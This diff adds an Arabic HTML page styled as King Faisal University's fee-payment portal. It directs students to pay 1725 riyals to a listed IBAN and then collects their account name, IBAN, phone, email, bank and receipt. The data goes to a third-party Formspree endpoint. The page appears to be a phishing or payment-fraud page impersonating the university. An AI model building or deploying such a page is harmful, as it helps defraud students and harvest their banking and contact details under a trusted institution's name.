@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سداد رسوم الترم - جامعة الملك فيصل</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="header">
+    <div class="logo">
+        <img src="logo.png" alt="شعار الجامعة">
+    </div>
+    <div class="title">
+        <h1>جامعة الملك فيصل</h1>
+    </div>
+</div>
+
+<div class="main-content">
+    <h2>بوابة القبول الأكاديمي</h2>
+    <div class="container">
+        <p class="f">فاتورة السداد</p>
+        <div class="info">
+            <strong>الرسوم الإدارية:</strong> <span id="adminFees">575 ريال</span>
+        </div>
+        <div class="info">
+            <strong>رسوم فتح الجدول:</strong> <span id="tableFees">1150 ريال</span>
+        </div>
+        <div class="info">
+            <strong>الإجمالي:</strong> <span id="totalFees">1725 ريال</span>
+        </div>
+        <div class="info">
+            <p>يتم سداد الرسوم إلى الآيبان التالي:</p>
+            <strong>SA06 8000 0648 6080 1684 3391</strong>
+        </div>
+    </div>
+
+    <h2>تأكيد السداد</h2>
+    <div class="container">
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="accountName">:اسم صاحب الحساب</label>
+                <input type="text" name="accountName" id="accountName" required>
+            </div>
+            <div class="form-group">
+                <label for="iban">:رقم الإيبان</label>
+                <input type="text" name="iban" id="iban" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">:رقم الجوال</label>
+                <input type="tel" name="phone" id="phone" required>
+            </div>
+            <div class="form-group">
+                <label for="email">:البريد الإلكتروني</label>
+                <input type="email" name="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label for="bankName">:اسم البنك المودع منه</label>
+                <input type="text" name="bankName" id="bankName" required>
+            </div>
+            <div class="form-group">
+                <label for="receipt">:إرفاق إيصال السداد</label>
+                <input type="file" name="receipt" id="receipt" accept=".jpg, .jpeg, .png, .pdf" required>
+            </div>
+            <button type="submit" class="button">إرسال</button>
+        </form>
+        <p id="responseMessage" style="text-align: center;"></p>
+    </div>
+</div>
+
+<div class="footer">
+    &copy; 2024 جامعة الملك فيصل. جميع الحقوق محفوظة.
+</div>
+
+<script>
+    document.getElementById('paymentForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const formData = new FormData(this);
+
+        fetch('https://formspree.io/f/xyzzeqkr', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('responseMessage').innerText = "تم إرسال البيانات بنجاح!";
+            } else {
+                throw new Error("فشل إرسال البيانات.");
+            }
+        })
+        .catch(error => {
+            document.getElementById('responseMessage').innerText = error.message;
+        });
+    });
+</script>
+
+</body>
+</html>
